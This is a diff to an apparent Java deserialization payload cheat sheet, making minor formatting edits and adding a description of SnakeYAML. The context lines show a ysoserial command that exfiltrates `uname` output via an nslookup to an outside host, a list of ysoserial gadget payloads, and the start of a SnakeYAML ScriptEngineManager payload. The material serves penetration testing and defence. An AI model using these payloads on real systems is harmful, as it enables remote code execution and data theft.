@@ -21,7 +21,7 @@
     * `AC ED`: STREAM_MAGIC. Specifies that this is a serialization protocol.
     * `00 05`: STREAM_VERSION. The serialization version.
 - `"rO0"` in Base64
-- Content-type = "application/x-java-serialized-object"
+- `Content-Type` = "application/x-java-serialized-object"
 - `"H4sIAAAAAAAAAJ"` in gzip(base64)
 
 
@@ -41,7 +41,7 @@ java -jar ysoserial.jar Jdk7u21 bash -c 'nslookup `uname`.[redacted]' | gzip | b
 **List of payloads included in ysoserial:**
 
 | Payload             | Authors                                | Dependencies |
-| ------------------- | -------------------------------------- | --- |                                                                                                                                                                      
+| ------------------- | -------------------------------------- | --- |
 | AspectJWeaver       | @Jang                                  | aspectjweaver:1.9.2, commons-collections:3.2.2 |
 | BeanShell1          | @pwntester, @cschneider4711            | bsh:2.0b5 |
 | C3P0                | @mbechler                              | c3p0:0.9.5.2, mchange-commons-java:0.2.11 |
@@ -136,7 +136,7 @@ Payload generators for the following marshallers are included:
 
 ## YAML Deserialization
 
-SnakeYAML
+SnakeYAML is a popular Java-based library used for parsing and emitting YAML (YAML Ain't Markup Language) data. It provides an easy-to-use API for working with YAML, a human-readable data serialization standard commonly used for configuration files and data exchange.
 
 ```yaml
 !!javax.script.ScriptEngineManager [
